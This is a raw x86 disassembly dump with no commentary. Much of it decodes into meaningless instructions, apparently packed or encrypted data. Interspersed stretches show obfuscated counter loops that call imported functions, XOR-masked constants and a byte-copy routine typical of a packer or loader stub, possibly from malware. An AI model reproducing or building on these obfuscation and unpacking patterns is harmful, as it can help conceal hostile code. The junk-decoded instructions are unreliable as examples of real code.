  410190:	and    dh,BYTE PTR [esi-0x2fe2478]
  410196:	retf   0xa49a
  410199:	mov    ebx,0x7b1f13e9
  41019e:	jmp    FWORD PTR [edi]
  4101a0:	add    BYTE PTR [ecx],dh
  4101a2:	bound  ebx,QWORD PTR [ebp+0x7464a4c6]
  4101a8:	cmc    
  4101a9:	xchg   eax,ebp
  4101ab:	mov    BYTE PTR [eax-0x5],ch
  4101ae:	leave  
  4101af:	std    
  4101b0:	ror    DWORD PTR [ecx],1
  4101b2:	cwde   
  4101b3:	dec    ebp
  4101b4:	jl     0x4101ae
  4101b6:	mov    cl,0xde
  4101b8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4101b9:	aaa    
  4101ba:	xlat   BYTE PTR ds:[ebx]
  4101bb:	icebp  
  4101bc:	leave  
  4101bd:	add    ch,ah
  4101bf:	sub    DWORD PTR [ebx+ebp*1-0x73],ecx
  4101c3:	cmc    
  4101c4:	(bad)  
  4101c6:	(bad)  
  4101c7:	neg    BYTE PTR [edx-0xc]
  4101ca:	dec    edi
  4101cb:	ins    DWORD PTR es:[edi],dx
  4101cc:	in     eax,dx
  4101cd:	jo     0x410232
  4101cf:	pusha  
  4101d0:	shl    BYTE PTR cs:[ebp-0x21],1
  4101d4:	fnstsw WORD PTR [ecx-0x3]
  4101d7:	or     BYTE PTR [ecx+0x1052f60a],dl
  4101dd:	mov    bl,0x5e
  4101df:	std    
  4101e0:	mov    ecx,0x28442b9c
  4101e5:	outs   dx,DWORD PTR ds:[esi]
  4101e6:	out    0x6,al
  4101e8:	jmp    0x41016a
  4101ea:	adc    esp,ebx
  4101ec:	sbb    eax,0x9d7bf632
  4101f1:	inc    eax
  4101f2:	sar    BYTE PTR [esp+eax*2],1
  4101f5:	sahf   
  4101f6:	repz rcl BYTE PTR [edi-0x42],1
  4101fa:	psubusb mm4,QWORD PTR [edx+0x0]
  4101fe:	rol    edx,1
  410200:	pop    ss
  410201:	mov    DWORD PTR [ebx],ebp
  410203:	lods   al,BYTE PTR ds:[esi]
  410204:	push   ebx
  410205:	cdq    
  410206:	xlat   BYTE PTR ds:[ebx]
  410207:	xor    eax,0xa29fd428
  41020c:	jge    0x41027f
  41020e:	aaa    
  41020f:	sub    eax,0x3ad105a
  410214:	pop    ecx
  410215:	ficomp WORD PTR [edi]
  410217:	outs   dx,BYTE PTR ds:[esi]
  410218:	fild   DWORD PTR ds:0xd8da14c9
  41021e:	sbb    al,0x6c
  410220:	repz retfw 0x3fa4
  410225:	cmp    eax,DWORD PTR [edx-0xd553bae]
  41022b:	dec    ebx
  41022c:	mov    eax,ds:0x98a48dc0
  410231:	pop    edi
  410232:	rcr    cl,cl
  410234:	loopne 0x41023a
  410236:	sbb    ecx,DWORD PTR [edi+0x1da0a257]
  41023c:	sti    
  41023d:	aad    0xa
  41023f:	push   cs
  410240:	(bad)
  410244:	inc    edx
  410245:	enter  0xa5e9,0xa7
  410249:	add    BYTE PTR [esi+0x2c],cl
  41024c:	lods   al,BYTE PTR ds:[esi]
  41024d:	pop    eax
  41024e:	pop    eax
  41024f:	(bad)  
  410250:	addr16 arpl di,si
  410253:	lods   al,BYTE PTR ds:[esi]
  410254:	clc    
  410255:	jnp    0x410295
  410257:	pusha  
  410258:	jecxz  0x4102a2
  41025a:	lds    ecx,FWORD PTR [ebx-0x61]
  41025d:	xchg   esi,eax
  41025e:	out    0xbf,al
  410260:	daa    
  410261:	cs inc edi
  410263:	or     eax,0xf366b5ea
  410268:	test   DWORD PTR [edx],esi
  41026a:	cmp    eax,0xfd30e39f
  41026f:	xchg   BYTE PTR [edi],al
  410271:	jo     0x410279
  410273:	inc    ebp
  410274:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410275:	sub    BYTE PTR [edi+esi*2+0x7028abf0],0xa2
  41027d:	stos   BYTE PTR es:[edi],al
  41027e:	aas    
  41027f:	dec    ebp
  410280:	push   ss
  410281:	fs ds je 0x410291
  410285:	dec    ecx
  410286:	mov    esp,0xe9c3bdea
  41028b:	cmp    edx,DWORD PTR [eax+esi*4+0x34eccd62]
  410292:	ins    DWORD PTR es:[edi],dx
  410293:	push   ss
  410294:	stc    
  410295:	mov    esi,DWORD PTR [ebp-0x8]
  410298:	mov    DWORD PTR ds:0x4337eb,0x5b5
  4102a2:	xor    eax,edx
  4102a4:	xor    esi,edx
  4102a6:	add    eax,ecx
  4102a8:	sub    DWORD PTR ds:0x43370f,0x433803
  4102b2:	add    esi,ecx
  4102b4:	imul   eax,esi
  4102b7:	jmp    0x41034e
  4102bc:	mov    DWORD PTR ds:0x433713,0x12
  4102c6:	cmp    DWORD PTR ds:0x433713,0x0
  4102cd:	je     0x410313
  4102d3:	cmp    DWORD PTR ds:0x433713,0x7
  4102da:	jne    0x4102eb
  4102e0:	push   0x1099
  4102e5:	call   DWORD PTR ds:0x412038
  4102eb:	cmp    DWORD PTR ds:0x433713,0x8
  4102f2:	jne    0x410303
  4102f8:	mov    eax,ds:0x433713
  4102fd:	dec    eax
  4102fe:	mov    ds:0x433713,eax
  410303:	mov    eax,ds:0x433713
  410308:	dec    eax
  410309:	mov    ds:0x433713,eax
  41030e:	jmp    0x4102c6
  410313:	mov    eax,DWORD PTR [ebp+0xc]
  410316:	mov    eax,DWORD PTR [eax+0x78]
  410319:	mov    DWORD PTR [ebp+0xc],eax
  41031c:	mov    eax,DWORD PTR [ebp-0x4]
  41031f:	mov    esi,DWORD PTR [ebp-0x8]
  410322:	xor    eax,edx
  410324:	xor    esi,edx
  410326:	add    eax,ecx
  410328:	add    esi,ecx
  41032a:	imul   eax,esi
  41032d:	mov    esi,DWORD PTR [ebp+0xc]
  410330:	cmp    esi,eax
  410332:	mov    eax,DWORD PTR [ebp-0x4]
  410335:	je     0x40ffbc
  41033b:	xor    eax,edx
  41033d:	add    eax,ecx
  41033f:	mov    ecx,DWORD PTR [ebp+0xc]
  410342:	imul   eax,ecx
  410345:	add    eax,DWORD PTR [ebp+0x8]
  410348:	mov    DWORD PTR [ebp+0xc],eax
  41034b:	mov    eax,DWORD PTR [ebp+0xc]
  41034e:	pop    esi
  41034f:	leave  
  410350:	ret    0x8
  410353:	push   ebp
  410354:	mov    ebp,esp
  410356:	push   ecx
  410357:	and    DWORD PTR ds:0x43370f,0x0
  410361:	jmp    0x410371
  410366:	mov    eax,ds:0x43370f
  41036b:	inc    eax
  41036c:	mov    ds:0x43370f,eax
  410371:	cmp    DWORD PTR ds:0x43370f,0x11
  410378:	jae    0x4103b4
  41037e:	cmp    DWORD PTR ds:0x43370f,0x9
  410385:	jne    0x410391
  41038b:	call   DWORD PTR ds:0x41203c
  410391:	cmp    DWORD PTR ds:0x43370f,0x8
  410398:	jne    0x4103a9
  41039e:	mov    eax,ds:0x43370f
  4103a3:	inc    eax
  4103a4:	mov    ds:0x43370f,eax
  4103a9:	jmp    0x410366
  4103ae:	xor    DWORD PTR ds:0x43371f,edi
  4103b4:	push   ecx
  4103b5:	add    DWORD PTR ds:0x43377f,0x4337bf
  4103bf:	mov    eax,0xf89c8531
  4103c4:	or     edx,DWORD PTR ds:0x433767
  4103ca:	mov    DWORD PTR [ebp-0x8],eax
  4103cd:	jmp    0x41065e
  4103d2:	jne    0x4103d9
  4103d4:	dec    eax
  4103d5:	cs push 0xee457173
  4103db:	xchg   edx,eax
  4103dc:	or     DWORD PTR [ebp-0x587dcccd],esp
  4103e2:	and    eax,0xea7e7ebd
  4103e7:	jl     0x410467
  4103e9:	jle    0x4103b9
  4103eb:	or     dh,BYTE PTR [ebp+0x72]
  4103ee:	mov    ebp,0xab778524
  4103f3:	cwde   
  4103f4:	push   edx
  4103f5:	sbb    eax,DWORD PTR [edi]
  4103f7:	fs dec esi
  4103f9:	mov    ebp,0xb89564c9
  4103fe:	or     BYTE PTR [ebp-0x2e42c859],ch
  410404:	and    al,0x5c
  410406:	clc    
  410407:	add    esi,esp
  410409:	jns    0x4103fe
  41040b:	test   eax,0xe327e0cf
  410410:	test   eax,0x61d8ee23
  410415:	mov    cl,0xbd
  410417:	fcmovb st,st(3)
  410419:	mov    ebp,0x1ea8e43e
  41041e:	adc    ecx,esp
  410420:	fadd   DWORD PTR [ebx-0xf]
  410423:	out    dx,al
  410424:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  410425:	jge    0x41047e
  410427:	lock adc DWORD PTR [eax+0x59],esi
  41042b:	test   al,0xb1
  41042d:	inc    esp
  41042e:	sti    
  41042f:	and    dl,BYTE PTR es:[edx-0xabc0e24]
  410436:	pop    eax
  410437:	bound  eax,QWORD PTR [ecx+0x162a7bb1]
  41043d:	add    DWORD PTR [esi],ebx
  41043f:	jmp    0x8d689ce2
  410444:	retf   
  410445:	mov    ds:0xb7fe45f5,al
  41044a:	lock adc dl,BYTE PTR [eax+0x65]
  41044e:	cmp    DWORD PTR [ebx],esi
  410450:	fsubp  st(0),st
  410452:	mov    ds:0x3f38ae8d,eax
  410457:	mov    ah,0xc4
  410459:	xchg   ecx,eax
  41045a:	outs   dx,BYTE PTR ds:[esi]
  41045b:	push   0x8905fad9
  410460:	cwde   
  410461:	mov    edi,0x712f44c1
  410466:	pop    eax
  410467:	jno    0x4104a6
  410469:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41046a:	dec    esi
  41046b:	jmp    0x410441
  41046d:	push   edx
  41046e:	test   DWORD PTR [eax+0x41b3190d],ecx
  410474:	ficom  DWORD PTR [ecx+0x70]
  410477:	pop    eax
  410478:	loop   0x410432
  41047a:	(bad)  
  41047b:	push   edi
  41047c:	pop    edx
  41047d:	jp     0x4104ef
  41047f:	lds    esi,FWORD PTR [eax+0x650eedd0]
  410485:	sbb    esi,DWORD PTR [ebx+ebp*2+0x24]
  410489:	fnstenv [esi+0x4fddac5d]
  41048f:	or     bl,BYTE PTR [eax+0x55688ceb]
  410495:	add    eax,0x8601cb75
  41049a:	jb     0x41044e
  41049c:	jne    0x41051c
  41049e:	outs   dx,BYTE PTR ds:[esi]
  41049f:	imul   edi,DWORD PTR [ebx-0x9],0x1
  4104a3:	or     eax,0x20f143ff
  4104a8:	xlat   BYTE PTR ds:[ebx]
  4104a9:	pop    eax
  4104aa:	sbb    BYTE PTR [edx+0x4],0x88
  4104ae:	pop    ebp
  4104af:	jno    0x41044c
  4104b1:	adc    al,0x36
  4104b3:	push   es
  4104b4:	sbb    al,0x83
  4104b6:	push   ss
  4104b7:	push   ds
  4104b8:	fucom  st(2)
  4104ba:	cmp    DWORD PTR [edx+ebp*4-0x5f9b62d8],edx
  4104c1:	fcmovu st,st(4)
  4104c3:	nop
  4104c4:	clc    
  4104c5:	outs   dx,DWORD PTR ds:[esi]
  4104c6:	add    dh,BYTE PTR ds:0xb5d4f14e
  4104cc:	je     0x410455
  4104ce:	fmul   st,st(0)
  4104d0:	shr    BYTE PTR [ecx-0x60def898],1
  4104d6:	jns    0x410518
  4104d8:	jge    0x410548
  4104da:	lods   al,BYTE PTR ds:[esi]
  4104db:	jne    0x410500
  4104dd:	aaa    
  4104de:	xchg   esp,eax
  4104df:	shl    dl,cl
  4104e1:	jl     0x4104fb
  4104e3:	in     al,0x42
  4104e5:	in     al,0x2d
  4104e7:	in     al,dx
  4104e8:	aam    0xc6
  4104ea:	loope  0x410539
  4104ec:	ror    DWORD PTR [ecx+0x24],0x89
  4104f0:	jne    0x4104c9
  4104f2:	scas   al,BYTE PTR es:[edi]
  4104f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4104f4:	jnp    0x410509
  4104f6:	or     edx,DWORD PTR [edi+0xfb161ca]
  4104fc:	or     DWORD PTR [edi+0x33],edx
  4104ff:	pushf  
  410500:	push   ebx
  410501:	mov    ds:0x6db8982f,eax
  410506:	mov    ecx,0x1ba93aed
  41050b:	push   ebp
  41050c:	xchg   esi,eax
  41050d:	push   ds
  41050e:	shl    DWORD PTR [esi+esi*4],cl
  410511:	popf   
  410512:	inc    ebx
  410513:	jecxz  0x410503
  410515:	push   edx
  410516:	jns    0x410549
  410518:	out    dx,eax
  410519:	sar    BYTE PTR [ebx-0x4d565268],cl
  41051f:	call   0xcd1f2a88
  410524:	icebp  
  410525:	mov    ebp,0x63f78c7d
  41052a:	fwait
  41052b:	adc    bh,dl
  41052d:	cmp    DWORD PTR [ebx+0x48],0xfcfc47ed
  410534:	adc    BYTE PTR [eax+0x19a67cd0],ch
  41053a:	(bad)  
  41053b:	jno    0x410512
  41053d:	push   ebx
  41053e:	mov    cl,0x50
  410540:	in     eax,dx
  410541:	fdivr  DWORD PTR [ebx]
  410543:	xor    DWORD PTR [ecx],0xc928fffb
  410549:	repnz push eax
  41054b:	inc    esi
  41054c:	es in  al,0xb8
  41054f:	jg     0x410591
  410551:	mov    cl,0x33
  410553:	ret    
  410554:	sbb    bl,BYTE PTR [esi]
  410556:	mov    ah,BYTE PTR [ebx]
  410558:	inc    edx
  410559:	cmp    al,0x16
  41055b:	aad    0x9f
  41055d:	pop    ebp
  41055e:	jmp    DWORD PTR [esi]
  410560:	push   0x2d56150
  410565:	sbb    dh,dl
  410567:	xchg   ecx,eax
  410568:	fimul  DWORD PTR [ebx-0x7]
  41056b:	push   cs
  41056c:	and    edi,DWORD PTR [esp+ebx*8]
  41056f:	xor    cl,BYTE PTR [edx+0x63da7490]
  410575:	mov    edi,DWORD PTR [ecx]
  410577:	stc    
  410578:	je     0x4105f4
  41057a:	ret    
  41057b:	ror    DWORD PTR [ecx+eax*2],1
  41057e:	(bad)  
  410581:	inc    edx
  410582:	add    edi,DWORD PTR [eax]
  410584:	push   eax
  410585:	cmp    BYTE PTR [ecx+0x57],bl
  410588:	cld    
  410589:	shr    BYTE PTR [edi-0x1b],0x87
  41058d:	jmp    0x410555
  41058f:	enter  0x8cc4,0x13
  410593:	outs   dx,DWORD PTR ds:[esi]
  410594:	lods   al,BYTE PTR ds:[esi]
  410595:	ss pop ebx
  410597:	add    DWORD PTR [ecx+0x56ace6fd],eax
  41059d:	add    eax,0x167abde8
  4105a2:	inc    ebx
  4105a3:	(bad)  
  4105a5:	imul   esp,DWORD PTR [edi+0x4872706b],0xffffffb8
  4105ac:	mov    bh,0x5d
  4105ae:	push   ebx
  4105af:	test   eax,0x9881f8a3
  4105b4:	gs inc ebp
  4105b6:	loope  0x41062f
  4105b8:	popf   
  4105b9:	and    DWORD PTR [ebx+0x4d50d8c1],ebp
  4105bf:	xchg   edi,eax
  4105c0:	jo     0x410574
  4105c2:	es addr16 xchg ebp,eax
  4105c5:	xchg   ebp,eax
  4105c6:	cmp    al,0x8a
  4105c8:	push   eax
  4105c9:	adc    al,0x33
  4105cb:	fbld   TBYTE PTR [ebx+0x72]
  4105ce:	sub    ecx,ecx
  4105d0:	and    BYTE PTR [eax-0x3599b3f5],bh
  4105d6:	fdiv   QWORD PTR [esi]
  4105d8:	push   edi
  4105d9:	(bad)  
  4105da:	adc    esp,ecx
  4105dc:	push   esp
  4105dd:	pop    esp
  4105de:	push   ecx
  4105df:	dec    ecx
  4105e0:	sbb    DWORD PTR [ebp+0x9],ebx
  4105e3:	fisttp QWORD PTR [ebp*4-0x183f07b5]
  4105ea:	xchg   edx,eax
  4105eb:	test   DWORD PTR [eax],ecx
  4105ed:	add    al,0x20
  4105ef:	test   al,0x98
  4105f1:	add    DWORD PTR ds:0xe985c2c,edi
  4105f7:	xchg   ecx,eax
  4105f8:	push   ss
  4105f9:	jge    0x410600
  4105fb:	pop    ebp
  4105fc:	or     edi,DWORD PTR [edx+0x1e]
  4105ff:	mov    ds:0xe41058ff,al
  410604:	push   ebp
  410605:	int    0x14
  410607:	mov    esp,0x653837b2
  41060c:	mov    al,0x26
  41060e:	inc    ecx
  41060f:	pop    ebx
  410610:	test   BYTE PTR [esi],ah
  410612:	or     DWORD PTR [ecx-0x32aaecbb],edx
  410618:	aad    0x41
  41061a:	pop    ss
  41061b:	inc    ebx
  41061c:	es sahf 
  41061e:	imul   edi,DWORD PTR [ecx],0x26
  410621:	jno    0x4105e3
  410623:	or     al,0x38
  410625:	or     BYTE PTR [ecx-0x7eab44f4],cl
  41062b:	mov    esp,0xeefd82df
  410630:	es stos DWORD PTR es:[edi],eax
  410632:	pop    ecx
  410633:	repnz mov dl,0x71
  410636:	aas    
  410637:	mov    BYTE PTR [edi*1+0x37babbc9],dh
  41063e:	push   esp
  41063f:	xchg   ecx,eax
  410640:	sbb    BYTE PTR [edi],dl
  410642:	dec    esp
  410643:	(bad)  
  410644:	sbb    bl,BYTE PTR [ecx+ecx*4]
  410647:	sub    eax,0x9f0fa822
  41064c:	sub    BYTE PTR [ebx],bl
  41064e:	push   esp
  41064f:	sahf   
  410650:	push   ss
  410651:	mul    DWORD PTR [ebx+edi*1]
  410654:	nop
  410655:	jmp    0x6ad1:0x6edcb752
  41065c:	inc    ebx
  41065d:	push   esp
  41065e:	mov    DWORD PTR [ebp-0x4],0xf89c8532
  410665:	and    DWORD PTR ds:0x433713,0x0
  41066f:	mov    edx,DWORD PTR ds:0x433713
  410675:	inc    edx
  410676:	mov    DWORD PTR ds:0x433713,edx
  41067c:	cmp    DWORD PTR ds:0x433713,0x22
  410683:	jne    0x410692
  410689:	push   DWORD PTR [ebp-0x20]
  41068c:	call   DWORD PTR ds:0x412040
  410692:	cmp    DWORD PTR ds:0x433713,0x12
  410699:	jb     0x41066f
  41069f:	xor    edx,edx
  4106a1:	or     edx,DWORD PTR ds:0x4337ef
  4106a7:	sbb    edx,DWORD PTR ds:0x43371b
  4106ad:	mov    DWORD PTR ds:0x4337ef,edx
  4106b3:	mov    edx,DWORD PTR [ebp-0x8]
  4106b6:	mov    DWORD PTR ds:0x433733,0x17
  4106c0:	cmp    DWORD PTR ds:0x433733,0x0
  4106c7:	je     0x410724
  4106cd:	cmp    DWORD PTR ds:0x433733,0xc
  4106d4:	jne    0x4106ee
  4106da:	push   0x4338fc
  4106df:	push   DWORD PTR [ebp-0x1c]
  4106e2:	push   DWORD PTR [ebp-0x18]
  4106e5:	push   DWORD PTR [ebp-0x1c]
  4106e8:	call   DWORD PTR ds:0x4121e8
  4106ee:	cmp    DWORD PTR ds:0x433733,0xd
  4106f5:	jne    0x410708
  4106fb:	mov    ecx,DWORD PTR ds:0x433733
  410701:	dec    ecx
  410702:	mov    DWORD PTR ds:0x433733,ecx
  410708:	mov    ecx,DWORD PTR ds:0x433733
  41070e:	dec    ecx
  41070f:	mov    DWORD PTR ds:0x433733,ecx
  410715:	jmp    0x4106c0
  41071a:	mov    DWORD PTR ds:0x4337f3,0x1fcc
  410724:	push   esi
  410725:	xor    DWORD PTR ds:0x4337b7,ebx
  41072b:	mov    ecx,0x7510854
  410730:	sbb    DWORD PTR ds:0x433717,ecx
  410736:	xor    edx,ecx
  410738:	mov    esi,0x32729b
  41073d:	adc    DWORD PTR ds:0x433727,0x4337ab
  410747:	push   edi
  410748:	mov    edi,DWORD PTR [ebp+0x10]
  41074b:	add    edx,esi
  41074d:	cmp    edi,edx
  41074f:	je     0x410a59
  410755:	mov    edx,DWORD PTR [ebp-0x8]
  410758:	mov    eax,DWORD PTR [ebp-0x4]
  41075b:	xor    eax,ecx
  41075d:	mov    edi,0xffcd8d65
  410762:	sub    edi,eax
  410764:	add    edi,DWORD PTR [ebp+0x10]
  410767:	xor    edx,ecx
  410769:	add    edx,esi
  41076b:	cmp    edx,edi
  41076d:	ja     0x410a54
  410773:	push   ebx
  410774:	jmp    0x41077e
  410779:	mov    esi,0x32729b
  41077e:	mov    eax,DWORD PTR [ebp-0x8]
  410781:	mov    edi,DWORD PTR [ebp-0x4]
  410784:	xor    edi,ecx
  410786:	add    edi,esi
  410788:	mov    esi,DWORD PTR [ebp+0x8]
  41078b:	imul   edi,edx
  41078e:	mov    ebx,DWORD PTR [ebp+0xc]
  410791:	xor    eax,ecx
  410793:	add    eax,edx
  410795:	mov    al,BYTE PTR [ebx+eax*1+0x32729b]
  41079c:	mov    BYTE PTR [edi+esi*1],al
  41079f:	mov    eax,DWORD PTR [ebp-0x4]
  4107a2:	xor    eax,ecx
  4107a4:	lea    edx,[edx+eax*1+0x32729b]
  4107ab:	mov    eax,DWORD PTR [ebp-0x4]
  4107ae:	xor    eax,ecx
  4107b0:	mov    esi,0xffcd8d65
  4107b5:	sub    esi,eax
  4107b7:	add    esi,DWORD PTR [ebp+0x10]
  4107ba:	cmp    edx,esi
  4107bc:	jbe    0x410779
  4107c2:	pop    ebx
  4107c3:	jmp    0x410a54
  4107c8:	out    dx,eax
  4107c9:	adc    al,0x6b
  4107cb:	adc    esi,DWORD PTR [ecx+0x71]
  4107ce:	ja     0x4107c0
  4107d0:	or     DWORD PTR [eax],0x28
  4107d3:	icebp  
  4107d4:	mov    dh,BYTE PTR [esi]
  4107d6:	rcl    DWORD PTR ss:[ecx-0x15818145],cl
  4107dd:	jl     0x41085d
  4107df:	jle    0x41079e
  4107e1:	xor    ebp,edi
  4107e3:	mov    edx,0x52289cdc
  4107e8:	call   0x6281:0x2d9ba5ac
  4107ef:	cmp    al,0xae
  4107f1:	ja     0x41080f
  4107f3:	mov    edi,0x8eef6ee0
  4107f8:	dec    eax
  4107f9:	pop    ds
  4107fa:	mov    ah,0x3c
  4107fc:	xchg   ebx,eax
  4107fd:	and    eax,0x2faeee7c
  410802:	mov    eax,0x1be5ff80
  410807:	jb     0x410857
  410809:	xor    dl,BYTE PTR [ebx-0x21d2b503]
  41080f:	sub    ch,BYTE PTR [eax]
  410811:	inc    esi
  410812:	ins    DWORD PTR es:[edi],dx
  410813:	aad    0x33
  410815:	pushf  
  410816:	lods   al,BYTE PTR ds:[esi]
  410817:	dec    ecx
  410818:	leave  
  410819:	(bad)  
  41081a:	or     al,0x6a
  41081c:	scas   eax,DWORD PTR es:[edi]
  41081d:	cld    
  41081e:	dec    esp
  41081f:	mov    edx,0x6ff0df71
  410824:	push   eax
  410825:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410826:	jmp    0xe04e3e30
  41082b:	mov    edi,0xbc4f28c1
  410830:	ror    DWORD PTR [esi],1
  410832:	jbe    0x4107f3
  410834:	add    esp,edx
  410836:	pushf  
  410837:	adc    DWORD PTR [edi-0x49],edi
  41083a:	imul   edx,DWORD PTR ds:0x22329191,0x27eada48
  410844:	cwde   
  410845:	sbb    ch,ch
  410847:	popf   
  410848:	add    al,0xa7
  41084a:	mov    ebp,0x53994cd4
  41084f:	loop   0x41087e
  410851:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  410853:	sub    ebp,DWORD PTR [ebx-0x40]
  410856:	sub    esi,edx
  410858:	lds    ecx,FWORD PTR cs:[ebx-0x1c]
  41085c:	mov    bl,0x1a
  41085e:	vpunpckhdq ymm3,ymm2,YMMWORD PTR [eax]
  410862:	mov    ds:0x9397d5e7,eax
  410867:	loopne 0x410800
  410869:	cmp    BYTE PTR [ebx],al
  41086b:	cli    
  41086c:	retf   0xb51a
  41086f:	daa    
  410870:	cmc    
  410871:	xchg   edx,eax
  410872:	xchg   edi,eax
  410873:	rcr    BYTE PTR [ecx-0x7f5eee2c],1
  410879:	aad    0x5e
  41087b:	mov    dh,0x0
  41087d:	lock mov edi,0x16f6f35a
  410883:	rcl    BYTE PTR [edi+esi*8-0x13],0xe9
  410888:	shr    al,cl
  41088a:	mov    esp,0xfdaffa8
  41088f:	adc    dh,BYTE PTR [ebx+esi*4-0x70]
  410893:	loopne 0x4108e0
  410895:	and    DWORD PTR [eax+0x673104a],ebp
  41089b:	repz out dx,al
  41089d:	loope  0x4108a3
  41089f:	test   BYTE PTR [ecx],0xe7
  4108a2:	in     al,0x75
  4108a4:	dec    ebp
  4108a5:	fwait
  4108a6:	and    eax,0xd94dd991
  4108ab:	retf   0xae2
  4108ae:	jnp    0x410928
  4108b0:	sar    DWORD PTR ds:0xcc465131,cl
  4108b6:	sbb    dl,BYTE PTR [edx+0x2c]
  4108b9:	fimul  DWORD PTR ss:[ecx+0x68]
  4108bd:	out    dx,eax
  4108be:	gs mov cl,0x5b
  4108c1:	(bad)  
  4108c2:	nop
  4108c3:	lea    eax,[eax-0x4d]
  4108c6:	ins    DWORD PTR es:[edi],dx
  4108c7:	loopne 0x410866
  4108c9:	dec    ebx
  4108ca:	pop    ds
  4108cb:	or     al,BYTE PTR [eax-0x5298d1b]
  4108d1:	jmp    0x410863
  4108d3:	test   eax,0x76710b57
  4108d8:	call   0xf05a8c12
  4108dd:	sbb    edx,eax
  4108df:	adc    ch,al
  4108e1:	ins    DWORD PTR es:[edi],dx
  4108e2:	sti    
  4108e3:	fwait
  4108e4:	xor    eax,0x125eef13
  4108e9:	(bad)  
  4108ea:	xchg   edx,eax
  4108eb:	or     al,BYTE PTR [ecx]
  4108ed:	das    
  4108ee:	in     eax,0x95
  4108f0:	aas    
  4108f1:	scas   al,BYTE PTR es:[edi]
  4108f2:	jns    0x41090b
  4108f4:	sub    al,0x26
  4108f6:	imul   esi,DWORD PTR [ebx+edi*4+0x278e3a0f],0x38
  4108fe:	mov    ds:0xc568c0f0,al
  410903:	or     al,0xea
  410905:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410906:	or     bl,BYTE PTR ds:0xf07fb68f
  41090c:	mov    ecx,0x5cc4958c
  410911:	sbb    eax,0x94421e4e
  410916:	ins    BYTE PTR es:[edi],dx
  410917:	inc    edx
  410918:	ds call 0xe388:0xedab09de
  410920:	adc    eax,0x4e420bed
  410925:	lahf   
  410926:	mov    edx,es
  410928:	cmp    eax,0xb495dc5d
  41092d:	adc    al,0x5
  41092f:	out    dx,eax
  410930:	bound  ebp,QWORD PTR [edx+0x795a0b98]
  410936:	mov    al,ds:0xc179eaa0
  41093b:	retf   
  41093c:	leave  
  41093d:	fwait
  41093e:	(bad)  
  41093f:	loope  0x4109b2
  410941:	lods   al,BYTE PTR ds:[esi]
  410942:	jmp    0x4108e2
  410944:	mov    ah,0xfb
  410946:	imul   ebp,DWORD PTR [ebp-0x54],0x32
  41094a:	repz xchg esp,eax
  41094c:	out    dx,eax
  41094d:	icebp  
  41094e:	ins    DWORD PTR es:[edi],dx
  41094f:	es push ss
  410951:	(bad)  
  410952:	repnz xor eax,0x178866dd
  410958:	add    ecx,DWORD PTR [edx+0x372d041e]
  41095e:	mov    ebp,0x1619ec7f
  410963:	cld    
  410964:	pop    ebp
  410965:	pop    ebx
  410966:	fdivr  st(0),st
  410968:	cmp    DWORD PTR [esi+0x74b7085],edi
  41096e:	jo     0x410973
  410970:	mov    ds:0x8461c80d,eax
  410975:	arpl   WORD PTR [eax],si
  410977:	xor    eax,0xd45f5b01
  41097c:	lea    ebp,[eax+0x52]
  41097f:	mov    eax,ds:0x90e0905e
  410984:	dec    edx
  410985:	mov    al,ds:0x71e86124
  41098a:	xchg   edx,eax
  41098b:	mov    ebx,DWORD PTR [ecx]
  41098d:	pop    ds
  41098e:	sub    DWORD PTR [ebx-0x23f0508c],eax
  410994:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410995:	call   0x1864994d
  41099a:	addr16 pop edi
  41099c:	ret    
  41099d:	lods   eax,DWORD PTR ds:[esi]
  41099e:	adc    BYTE PTR [esi-0x5f0d49f3],al
  4109a4:	add    edx,DWORD PTR [ebx+0x6a5ed768]
  4109aa:	sbb    BYTE PTR [edx+ecx*8+0x421b66a6],ch
  4109b1:	jmp    0x60e9:0xd4b26920
  4109b8:	sub    esi,edx
  4109ba:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4109bb:	in     al,dx
  4109bc:	sbb    BYTE PTR [ebp+0x23],bl
  4109bf:	(bad)  
  4109c0:	into   
  4109c1:	mov    dh,0x33
  4109c3:	aam    0xfa
  4109c5:	nop
  4109c6:	dec    ebx
  4109c7:	test   al,0xff
  4109c9:	(bad)  
  4109cb:	in     eax,dx
  4109cc:	or     ch,BYTE PTR [eax-0x7115ed32]
  4109d2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4109d3:	icebp  
  4109d4:	int    0xae
  4109d6:	jg     0x4109ba
  4109d8:	shl    DWORD PTR [edx+edx*1],1
  4109db:	or     esp,DWORD PTR [ebx]
  4109dd:	outs   dx,DWORD PTR es:[esi]
  4109df:	inc    ecx
  4109e0:	dec    esi
  4109e1:	outs   dx,BYTE PTR ds:[esi]
  4109e2:	jns    0x4109e1
  4109e4:	dec    edi
  4109e5:	nop
  4109e6:	int    0x52
  4109e8:	inc    esp
  4109e9:	shr    DWORD PTR [eax],1
  4109eb:	mov    dh,0xb8
  4109ed:	stc    
  4109ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4109ef:	mov    cl,0x9a
  4109f1:	stos   BYTE PTR es:[edi],al
  4109f2:	sbb    dl,BYTE PTR [ebp+eax*1+0x5ee24874]
  4109f9:	xor    al,BYTE PTR [ecx]
  4109fb:	adc    esi,DWORD PTR [esi]
  4109fd:	sbb    eax,0x5587f2e5
  410a02:	or     bh,dh
  410a04:	test   DWORD PTR [ebp+0x34],ecx
  410a07:	aaa    
  410a08:	je     0x410a5f
  410a0a:	or     BYTE PTR [esi+0x1b9be8f5],cl
  410a10:	shl    BYTE PTR [edx],1
  410a12:	inc    ebp
  410a13:	lock fdiv QWORD PTR [ebx+0x36]
  410a17:	ret    
  410a18:	or     ah,cl
  410a1a:	jb     0x410a1d
  410a1c:	jae    0x410a12
  410a1e:	(bad)  
  410a1f:	inc    ebx
  410a20:	xchg   esi,eax
  410a21:	jg     0x4109e0
  410a23:	add    edi,ecx
  410a25:	cld    
  410a26:	clc    
  410a27:	loop   0x4109e3
  410a29:	gs xor al,0x74
  410a2c:	loopne 0x4109c5
  410a2e:	sbb    DWORD PTR [ebp+0x5f],ebp
